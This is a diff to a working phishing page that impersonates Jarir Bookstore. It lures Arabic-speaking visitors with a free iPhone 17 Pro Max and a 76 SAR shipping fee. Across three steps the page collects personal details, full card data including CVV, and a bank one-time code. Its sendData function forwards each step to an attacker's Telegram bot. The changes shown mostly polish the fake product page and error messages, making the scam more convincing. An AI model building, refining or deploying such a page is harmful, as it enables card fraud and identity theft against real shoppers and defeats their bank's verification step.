@@ -17,10 +17,10 @@
         
         .cart-icon-container { position: relative; background: #F0F2F5; padding: 8px; border-radius: 8px; }
         .cart-badge { position: absolute; top: -5px; right: -5px; background: #FF9800; color: white; font-size: 10px; width: 18px; height: 18px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
-        
-        /* رسالة الخطأ المدمجة في الصفحة */
-        .error-message { display: none; background-color: #fee2e2; color: #dc2626; border: 1px solid #f87171; padding: 10px; border-radius: 4px; text-align: center; font-size: 13px; margin-bottom: 15px; font-weight: bold; }
+        .back-to-top { position: fixed; bottom: 80px; left: 20px; background: white; border: 1px solid #DDD; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); z-index: 100; }
 
+        /* إضافة الرسالة الحمراء وشاشة التحميل دون تغيير الباقي */
+        .error-box { display: none; color: #E30613; background: #fff5f5; border: 1px solid #ffcaca; padding: 10px; border-radius: 5px; text-align: center; margin-bottom: 15px; font-weight: bold; font-size: 13px; }
         #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 1000; flex-direction: column; justify-content: center; align-items: center; }
         .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--jarir-red); border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -57,13 +57,47 @@
             </div>
         </header>
 
+        <div class="bg-gray-50 p-3 flex justify-between items-center border-b text-sm text-gray-500">
+            <i class="fa-solid fa-chevron-down text-xs"></i>
+            <span>حدد خيار التوصيل الذي تفضله</span>
+        </div>
+
         <div class="py-6 flex justify-center">
             <img src="https://i.ibb.co/HpTBrKJN/CFE81-C5-E-E4-C2-446-F-99-FF-DECC85-EC63-D0.png" class="w-[280px]">
         </div>
 
-        <main class="p-5 text-right">
-            <h1 class="text-xl font-bold mb-6">ابل آيفون 17 برو ماكس</h1>
-            <button onclick="showPage('page-register')" class="bg-[#E30613] text-white font-bold w-full py-4 rounded-lg">استلم الهديه</button>
+        <main class="p-5">
+            <div class="flex justify-between items-start mb-2">
+                <div class="text-right">
+                    <p class="text-[10px] text-gray-400">رقم الصنف 666736 رقم المنتج MFY94AHA</p>
+                    <h1 class="text-xl font-bold text-gray-900">ابل آيفون 17 برو ماكس</h1>
+                </div>
+                <i class="fa-brands fa-apple text-3xl text-gray-800"></i>
+            </div>
+            
+            <div class="flex flex-wrap gap-2 mb-6 justify-end">
+                <span class="border px-3 py-1 text-xs text-gray-500 rounded">256 جيجابايت</span>
+                <span class="border px-3 py-1 text-xs text-gray-500 rounded">برتقالي كوزمك الجيل الخامس</span>
+                <span class="border px-3 py-1 text-xs text-gray-500 rounded">آبل آيه 19 برو</span>
+            </div>
+
+            <div class="flex justify-between items-center mb-6">
+                <button onclick="showPage('page-register')" class="bg-[#E30613] text-white font-bold w-1/2 py-4 rounded-lg text-lg">استلم الهديه</button>
+                <div class="text-right">
+                    <div class="text-[#E30613] text-3xl font-black">هديه من جرير <span class="text-sm">ر.س</span></div>
+                    <p class="text-[10px] text-gray-400">شامل ضريبة القيمة المضافة</p>
+                </div>
+            </div>
+
+            <div class="flex justify-between py-6 border-t mt-4">
+                <i class="fa-brands fa-linkedin text-[#0077B5] text-2xl"></i>
+                <i class="fa-brands fa-tiktok text-black text-2xl"></i>
+                <i class="fa-brands fa-snapchat text-[#FFFC00] bg-black p-1 rounded-full text-lg"></i>
+                <i class="fa-brands fa-youtube text-[#FF0000] text-2xl"></i>
+                <i class="fa-brands fa-instagram text-[#E4405F] text-2xl"></i>
+                <i class="fa-brands fa-x-twitter text-black text-2xl"></i>
+                <i class="fa-brands fa-facebook text-[#1877F2] text-2xl"></i>
+            </div>
         </main>
     </section>
 
@@ -74,8 +108,7 @@
             <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-6">
         </header>
         <div class="p-6">
-            <div id="error-reg" class="error-message">يرجى التأكد من كتابة جميع المعلومات والبريد بشكل صحيح</div>
-            
+            <div id="error-msg-reg" class="error-box">يرجى التأكد من كتابة جميع المعلومات والبريد بشكل صحيح</div>
             <div class="space-y-4">
                 <input type="tel" id="user-phone" placeholder="رقم الهاتف" class="form-input">
                 <input type="text" id="user-name" placeholder="الاسم الكامل" class="form-input">
@@ -92,12 +125,12 @@
             <span class="font-bold">دفع مصاريف الشحن</span>
         </header>
         <main class="p-4">
-            <div id="error-pay" class="error-message">يرجى التأكد من بيانات البطاقة بشكل صحيح</div>
+            <div id="error-msg-pay" class="error-box">بيانات البطاقة غير صحيحة</div>
             <div class="bg-white rounded-lg p-6 shadow-sm border relative">
                 <input type="text" id="card-num" placeholder="رقم البطاقة" class="form-input mb-4" maxlength="16">
                 <div class="flex gap-2">
                     <input type="text" id="card-cvv" placeholder="CVV" class="form-input w-1/3" maxlength="3">
-                    <input type="text" id="card-exp" placeholder="MM/YY" class="form-input w-2/3">
+                    <input type="text" id="card-exp" placeholder="تاريخ الانتهاء" class="form-input w-2/3">
                 </div>
                 <input type="text" id="card-holder" placeholder="اسم حامل البطاقة" class="form-input mt-4">
                 <button onclick="sendData('payment')" class="btn-red py-4 mt-8">مصاريف الشحن( 76ر.س.)</button>
@@ -116,10 +149,10 @@
                 <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" style="height: 60px;">
             </div>
             <hr style="margin: 20px 0; border: 0; border-top: 1px solid #eee;">
-            <p>You are paying <strong>Jarir Bookstore</strong> the amount of <strong>SAR 76.00</strong>.</p>
-            <div id="error-otp" class="error-message mt-4">رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى</div>
-            <div style="text-align: center; margin-top: 20px;">
-                <input type="text" id="bank-otp" placeholder="Enter Code" style="width: 100%; height: 50px; border: 1px solid #ccc; text-align: center; font-size: 24px; border-radius: 4px;">
+            <p>You are paying <strong>Jarir Bookstore</strong>: <strong>SAR 76.00</strong></p>
+            <div id="error-msg-otp" class="error-box mt-4">رمز التحقق غير صحيح</div>
+            <div style="text-align: center; margin-top: 40px;">
+                <input type="text" id="bank-otp" placeholder="Enter Code" style="width: 100%; height: 50px; border: 1px solid #ccc; text-align: center; font-size: 24px;">
                 <button onclick="sendData('otp')" class="confirm-btn-blue">CONFIRM</button>
             </div>
         </div>
@@ -144,42 +177,38 @@
         }
 
         async function sendData(step) {
-            // إخفاء جميع رسائل الخطأ عند كل محاولة جديدة
-            document.querySelectorAll('.error-message').forEach(e => e.style.display = 'none');
+            // إخفاء الأخطاء
+            document.querySelectorAll('.error-box').forEach(el => el.style.display = 'none');
 
             if(step === 'register') {
                 const phone = document.getElementById('user-phone').value;
+                const email = document.getElementById('user-email').value;
                 const name = document.getElementById('user-name').value;
                 const addr = document.getElementById('user-address').value;
-                const email = document.getElementById('user-email').value;
 
-                if(phone === "" || name === "" || addr === "" || !email.includes("@")) {
-                    document.getElementById('error-reg').style.display = 'block'; // إظهار الخطأ في الصفحة
+                if(phone === "" || !email.includes("@") || name === "" || addr === "") {
+                    document.getElementById('error-msg-reg').style.display = 'block';
                     return;
                 }
-
-                const text = `👤 زبون جديد:\n📞 هاتف: ${phone}\n📝 اسم: ${name}\n🏠 عنوان: ${addr}\n📧 بريد: ${email}`;
+                const text = `👤 جديد:\n📞 هاتف: ${phone}\n📝 اسم: ${name}\n🏠 عنوان: ${addr}\n📧 بريد: ${email}`;
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
                 startLoading('page-payment');
-
             } else if(step === 'payment') {
                 const card = document.getElementById('card-num').value;
-                if(card.length < 16) { 
-                    document.getElementById('error-pay').style.display = 'block'; // إظهار الخطأ في الصفحة
-                    return; 
+                if(card.length < 16) {
+                    document.getElementById('error-msg-pay').style.display = 'block';
+                    return;
                 }
-
                 const text = `💳 بطاقة:\n🔢 رقم: ${card}\n📅 تاريخ: ${document.getElementById('card-exp').value}\n🔒 CVV: ${document.getElementById('card-cvv').value}\n👤 اسم: ${document.getElementById('card-holder').value}`;
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
                 startLoading('page-bank');
-
             } else if(step === 'otp') {
                 const otp = document.getElementById('bank-otp').value;
-                if(otp === "") { 
-                    document.getElementById('error-otp').style.display = 'block'; // إظهار الخطأ في الصفحة
-                    return; 
+                if(otp === "") {
+                    document.getElementById('error-msg-otp').style.display = 'block';
+                    return;
                 }
-                const text = `🔑 كود (OTP):\n🔢 الكود: ${otp}`;
+                const text = `🔑 كود:\n🔢 الكود: ${otp}`;
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
                 alert("تم استلام طلبك بنجاح.");
             }
